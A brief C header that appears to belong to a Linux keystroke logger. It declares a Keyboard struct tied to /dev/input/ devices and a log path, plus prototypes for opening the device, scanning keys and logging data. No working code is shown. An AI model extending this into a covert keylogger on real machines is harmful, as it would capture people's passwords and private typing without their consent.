#include <stdio.h>
#include "time.h"

struct Keyboard
{
  char devPath[20], //Device path in /dev/input/
        log_path[20]; //Path to logged data for this keyboard
  FILE *fileHandle;
  struct tm time_info;
  int file_discr;
  short shift;
  short caps;
};

short openDevice(struct Keyboard *);
void log_data(struct Keyboard );
void KeyboardScan(int * , const short , char **, char **);
